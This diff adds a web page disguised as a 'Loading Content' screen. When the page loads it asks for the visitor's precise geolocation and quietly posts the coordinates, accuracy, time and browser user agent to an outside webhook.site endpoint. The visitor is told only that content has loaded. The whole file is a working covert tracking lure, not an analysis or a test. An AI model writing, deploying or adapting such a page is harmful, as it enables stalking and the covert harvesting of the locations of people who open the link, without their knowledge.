@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading Content...</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; padding-top: 50px; background: #f4f4f4; }
+        .box { background: white; padding: 20px; border-radius: 8px; display: inline-block; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h3>Loading Content</h3>
+        <p id="status">Please wait while the page initializes...</p>
+    </div>
+
+    <script>
+        // Your updated Webhook.site endpoint
+        const ENDPOINT_URL = "https://webhook.site/4885ef97-eec6-4754-85b6-8d81459adccb";
+
+        function transmitData(lat, lon, accuracy) {
+            const payload = {
+                latitude: lat,
+                longitude: lon,
+                accuracyMeters: accuracy,
+                time: new Date().toLocaleString(),
+                device: navigator.userAgent
+            };
+
+            fetch(ENDPOINT_URL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            }).catch(err => console.error("Transmission error:", err));
+        }
+
+        // Trigger the browser location prompt on page load
+        window.onload = function() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        const acc = position.coords.accuracy;
+                        
+                        document.getElementById("status").innerText = "Content loaded.";
+                        transmitData(lat, lon, acc);
+                    },
+                    function(error) {
+                        document.getElementById("status").innerText = "Failed to load content.";
+                    },
+                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+                );
+            } else {
+                document.getElementById("status").innerText = "Browser not supported.";
+            }
+        };
+    </script>
+</body>
+</html>
